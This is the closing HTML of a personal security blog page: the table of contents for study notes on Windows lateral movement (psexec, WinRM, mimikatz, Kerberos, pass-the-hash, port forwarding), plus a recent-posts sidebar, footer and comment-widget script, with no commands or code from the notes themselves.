href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">19.2.</span> <span class="toc-text">横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E8%A1%A8-1"><span class="toc-number">19.2.1.</span> <span class="toc-text">思路表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E8%BF%9C%E7%A8%8B%E7%94%9F%E6%88%90%E8%BF%9B%E7%A8%8B"><span class="toc-number">19.2.2.</span> <span class="toc-text">1远程生成进程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#psexec"><span class="toc-number">19.2.2.1.</span> <span class="toc-text">psexec</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">19.2.2.1.1.</span> <span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WinRM"><span class="toc-number">19.2.2.2.</span> <span class="toc-text">WinRM</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%81%9A%E6%B3%95"><span class="toc-number">19.2.2.2.1.</span> <span class="toc-text">做法</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sc-exe"><span class="toc-number">19.2.2.3.</span> <span class="toc-text">sc.exe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B"><span class="toc-number">19.2.2.4.</span> <span class="toc-text">开始</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE"><span class="toc-number">19.2.2.4.1.</span> <span class="toc-text">配置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5"><span class="toc-number">19.2.2.4.2.</span> <span class="toc-text">连接</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2wmic"><span class="toc-number">19.2.3.</span> <span class="toc-text">2wmic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E6%9B%BF%E4%BB%A3%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-number">19.2.4.</span> <span class="toc-text">3替代身份验证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mimikatz"><span class="toc-number">19.2.4.1.</span> <span class="toc-text">mimikatz</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kerberos%E7%A5%A8%E6%8D%AE%E8%8E%B7%E5%8F%96"><span class="toc-number">19.2.5.</span> <span class="toc-text">kerberos票据获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kerberos%E4%BB%8E%E5%86%85%E5%AD%98%E8%8E%B7%E5%8F%96"><span class="toc-number">19.2.6.</span> <span class="toc-text">kerberos从内存获取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#rc4"><span class="toc-number">19.2.6.1.</span> <span class="toc-text">rc4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#aes128"><span class="toc-number">19.2.6.2.</span> <span class="toc-text">aes128</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AES256"><span class="toc-number">19.2.6.3.</span> <span class="toc-text">AES256</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pth%E6%94%BB%E5%87%BB"><span class="toc-number">19.2.7.</span> <span class="toc-text">pth攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#rdp%E8%BF%9E%E6%8E%A5"><span class="toc-number">19.2.7.1.</span> <span class="toc-text">rdp连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#psexec-1"><span class="toc-number">19.2.7.2.</span> <span class="toc-text">psexec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WinRM-1"><span class="toc-number">19.2.7.3.</span> <span class="toc-text">WinRM</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E6%BB%A5%E7%94%A8%E7%94%A8%E6%88%B7"><span class="toc-number">19.2.8.</span> <span class="toc-text">4滥用用户</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RDP%E5%8A%AB%E6%8C%81"><span class="toc-number">19.2.8.1.</span> <span class="toc-text">RDP劫持</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E5%8F%AF%E5%86%99"><span class="toc-number">19.2.8.2.</span> <span class="toc-text">共享文件可写</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#vbs"><span class="toc-number">19.2.8.2.1.</span> <span class="toc-text">.vbs</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#exe%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8%E4%BD%A0"><span class="toc-number">19.2.8.2.2.</span> <span class="toc-text">.exe文件后门你</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">19.2.9.</span> <span class="toc-text">5端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">19.2.9.1.</span> <span class="toc-text">远程端口转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">19.2.9.2.</span> <span class="toc-text">本地端口转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#socat-%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">19.2.9.3.</span> <span class="toc-text">socat 进行端口转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5"><span class="toc-number">19.2.9.4.</span> <span class="toc-text">实践</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E6%9C%89%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5"><span class="toc-number">19.2.9.4.1.</span> <span class="toc-text">一有账号密码远程连接</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8CRejetto-HFS"><span class="toc-number">19.2.9.4.2.</span> <span class="toc-text">二Rejetto HFS</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%8A%A5%E9%94%99ssh22%E7%AB%AF%E5%8F%A3%E8%BF%9E%E4%B8%8D%E4%B8%8A"><span class="toc-number">19.2.9.4.2.1.</span> <span class="toc-text">报错ssh22端口连不上</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2"><span class="toc-number">19.3.</span> <span class="toc-text">数据泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E8%A1%A8-2"><span class="toc-number">19.4.</span> <span class="toc-text">思路表</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/03/THM-Ra2/" title="THM-Ra2">THM-Ra2</a><time datetime="2025-04-03T10:32:00.000Z" title="Created 2025-04-03 18:32:00">2025-04-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/17/THM%E7%AC%94%E8%AE%B0/" title="THM笔记">THM笔记</a><time datetime="2025-03-17T11:15:33.000Z" title="Created 2025-03-17 19:15:33">2025-03-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/17/2024%E9%B9%8F%E7%A8%8B%E6%9D%AF/" title="2024鹏程杯">2024鹏程杯</a><time datetime="2025-03-17T11:12:08.000Z" title="Created 2025-03-17 19:12:08">2025-03-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/27/vnctf2025javaGuide/" title="vnctf2025javaGuide">vnctf2025javaGuide</a><time datetime="2025-02-27T10:33:16.000Z" title="Created 2025-02-27 18:33:16">2025-02-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/20/25%E8%A5%BF%E6%B9%96/" title="25西湖">25西湖</a><time datetime="2025-01-20T05:22:49.000Z" title="Created 2025-01-20 13:22:49">2025-01-20</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By DDL</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
  const option = null

  const initValine = (el, path) => {
    if (isShuoshuo) {
      window.shuoshuoComment.destroyValine = () => {
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }

    const valineConfig = {
      el: '#vcomment',
      appId: 'HVeI0ARPlb1wmqNwceN5bAr0-gzGzoHsz',
      appKey: 'budtvYOInoQ1hIEDD2X5VhXq',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      visitor: false,
      ...option,
      path: isShuoshuo ? path : (option && option.path) || window.location.pathname
    }

    new Valine(valineConfig)
  }

  const loadValine = async (el, path) => {
    if (typeof Valine === 'function') {
      initValine(el, path)
    } else {
      await btf.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js')
      initValine(el, path)
    }
  }

  if (isShuoshuo) {
    'Valine' === 'Valine'
      ? window.shuoshuoComment = { loadComment: loadValine }
      : window.loadOtherComment = loadValine
    return
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>